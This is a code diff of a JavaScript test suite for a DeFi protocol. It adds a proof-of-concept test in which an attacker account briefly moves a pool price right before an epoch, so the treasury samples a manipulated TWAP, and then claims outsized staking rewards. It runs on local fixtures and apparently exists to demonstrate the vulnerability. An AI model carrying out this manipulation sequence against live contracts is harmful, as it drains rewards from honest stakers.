@@ -206,7 +206,7 @@ describe('OracleManipulator', () => {
     })
 
 
-    it('test dumping a shitkiad of WETH', async () => {
+    it('test dumping a shitoad of WETH', async () => {
         const [owner, tresury, alice, bob] = await ethers.getSigners();
         let {
             zapper,
@@ -215,7 +215,8 @@ describe('OracleManipulator', () => {
             favorEth,
             favorTreasury,
             uniTwapOracle,
-            mockOracle
+            mockOracle,
+            esteem
         } = await networkHelpers.loadFixture(deployContracts);
 
 
@@ -244,6 +245,9 @@ describe('OracleManipulator', () => {
         console.log("price1", price1.toString());
 
 
+        let pendingBonusStart = await favorEth.pendingBonus(alice);
+        console.log("alice pending bonus:", pendingBonusStart.toString());
+
         await weth.connect(alice).approve(zapper, 10_000_000_000n);
         //  now go 1 minute before the current epoch
         networkHelpers.time.increaseTo(nextEpochPoint - 60n);
@@ -256,6 +260,13 @@ describe('OracleManipulator', () => {
         //  alice bys a lot of favor, by dumping a shitload of weth
         console.log("alice has weth:", await weth.balanceOf(alice));
         await zapper.connect(alice).buy(weth, 10_000_000n, 0n, Date.now());
+
+        console.log('---------  alice sold  a lot WETH -----------')
+
+        let pendingBonusAfterSale = await favorEth.pendingBonus(alice);
+        console.log("alice pending bonus:", pendingBonusAfterSale.toString());
+        console.log("alice has havor:", await favorEth.balanceOf(alice));
+
 
         let [r0, r1] = await favorWethPair.getReserves();
         console.log("r0:", r0.toString(), "r1:", r1.toString());
@@ -294,7 +305,120 @@ describe('OracleManipulator', () => {
         let favorPriceAfter = await favorTreasury.getFavorPrice();
 
         console.log("favorPriceAfter:", favorPriceAfter.toString());
+
+
+        console.log('----------- alice has claimed bonus -----------')
+        await favorEth.connect(alice).claimBonus();
+        console.log('alice has got esteem:', await esteem.balanceOf(alice));
     })
+
+
+    it('shows Alice earning normally and Mallory draining with a TWAP attack', async () => {
+        const [owner, treasury, alice, mallory] = await ethers.getSigners();
+        const {
+            zapper,
+            weth,
+            favorEth,
+            favorWethPair,
+            favorTreasury,
+            mockOracle,
+            esteem,
+            grove,
+        } = await networkHelpers.loadFixture(deployContracts);
+
+        await grove.connect(owner).withdraw(1000n);
+        console.log("Bootstrap stake removed so only real actors remain");
+
+        const attackBankroll = 1_000_000_000_000n;
+        await weth.connect(owner).transfer(mallory.address, attackBankroll);
+        console.log("Owner seeds Mallory with", attackBankroll.toString(), "WETH for the upcoming attack");
+
+        console.log("\n=== Baseline epoch: honest user Alice ===");
+        const aliceStake = 1_000_000_000_000_000_000n;
+        await esteem.connect(owner).mint(alice.address, aliceStake);
+        await esteem.connect(alice).approve(grove, aliceStake);
+        await grove.connect(alice).stake(aliceStake);
+        console.log("Alice stakes", aliceStake.toString(), "ESTEEM to earn baseline rewards");
+
+        const firstEpochPoint = BigInt(await favorTreasury.nextEpochPoint());
+        const baselineBlock = await ethers.provider.getBlock('latest');
+        const currentTsBaseline = BigInt(baselineBlock?.timestamp ?? 0);
+        let baselineTarget = firstEpochPoint + 5n;
+        if (baselineTarget <= currentTsBaseline) {
+            baselineTarget = currentTsBaseline + 5n;
+        }
+        await networkHelpers.time.increaseTo(baselineTarget);
+        await favorTreasury.allocateSeigniorage();
+
+        const baselinePrice = await favorTreasury.getFavorPrice();
+        const aliceBaselineReward = await grove.earned(alice.address);
+        console.log("Treasury TWAP after honest epoch:", baselinePrice.toString());
+        console.log("Alice earns honest seigniorage:", aliceBaselineReward.toString());
+        await grove.connect(alice).claimReward();
+        console.log("Alice claims baseline reward, balance now:", (await favorEth.balanceOf(alice.address)).toString());
+
+        console.log("\n=== Manipulated epoch: Mallory attacks ===");
+        const malloryStake = 1_000_000_000_000_000_000n;
+        await esteem.connect(owner).mint(mallory.address, malloryStake);
+        await esteem.connect(mallory).approve(grove, malloryStake);
+        await grove.connect(mallory).stake(malloryStake);
+        console.log("Mallory stakes", malloryStake.toString(), "ESTEEM moments before the next epoch");
+
+        const secondEpochPoint = BigInt(await favorTreasury.nextEpochPoint());
+
+        await mockOracle.setLastPrice(favorEth, 1_000_000_000_000_000_000n);
+        await weth.connect(mallory).approve(zapper, 1_000_000_000_000n);
+        const malloryWethBefore = await weth.balanceOf(mallory.address);
+        let attackStart = secondEpochPoint - 30n;
+        const attackPrepBlock = await ethers.provider.getBlock('latest');
+        const currentTsAttackPrep = BigInt(attackPrepBlock?.timestamp ?? 0);
+        if (attackStart <= currentTsAttackPrep) {
+            attackStart = currentTsAttackPrep + 30n;
+        }
+
+        await networkHelpers.time.increaseTo(attackStart);
+        const attackSize = 10_000_000n;
+        await zapper.connect(mallory).buy(weth, attackSize, 0n, Date.now());
+        const malloryWethAfter = await weth.balanceOf(mallory.address);
+        const wethSpent = malloryWethBefore - malloryWethAfter;
+
+        const [res0, res1] = await favorWethPair.getReserves();
+        const favorAddr = (await favorEth.getAddress()).toLowerCase();
+        const token0Addr = (await favorWethPair.token0()).toLowerCase();
+        const oneEther = 1_000_000_000_000_000_000n;
+        const favorIsToken0 = token0Addr === favorAddr;
+        const spotAfterAttack = favorIsToken0
+            ? (BigInt(res1.toString()) * oneEther) / BigInt(res0.toString())
+            : (BigInt(res0.toString()) * oneEther) / BigInt(res1.toString());
+        console.log("Mallory spends", wethSpent.toString(), "WETH to push spot price to", spotAfterAttack.toString());
+
+        let settlementTarget = secondEpochPoint + 5n;
+        const settlementBlock = await ethers.provider.getBlock('latest');
+        const currentTsSettlement = BigInt(settlementBlock?.timestamp ?? 0);
+        if (settlementTarget <= currentTsSettlement) {
+            settlementTarget = currentTsSettlement + 5n;
+        }
+        await networkHelpers.time.increaseTo(settlementTarget);
+        await favorTreasury.connect(mallory).allocateSeigniorage();
+        const manipulatedPrice = await favorTreasury.getFavorPrice();
+        console.log("Treasury samples manipulated TWAP:", manipulatedPrice.toString());
+
+        const groveBalanceAfterAttack = await favorEth.balanceOf(grove);
+        console.log("Grove Favor balance after attack mint:", groveBalanceAfterAttack.toString());
+
+        const alicePending = await grove.earned(alice.address);
+        const malloryPending = await grove.earned(mallory.address);
+        console.log("Alice pending reward post-attack:", alicePending.toString());
+        console.log("Mallory pending reward post-attack:", malloryPending.toString());
+
+        await grove.connect(mallory).claimReward();
+        const malloryFavorAfterClaim = await favorEth.balanceOf(mallory.address);
+        console.log("Mallory claims attacker reward, Favor received:", malloryFavorAfterClaim.toString());
+
+        expect(manipulatedPrice).to.be.gt(baselinePrice);
+        expect(malloryPending).to.be.gt(aliceBaselineReward / 2n); // attacker earns half of a huge issuance
+        expect(malloryPending).to.be.gt(wethSpent * 1_000_000_000_000_000n); // dwarfs cost even before unwinding
+    });
 
 
 })
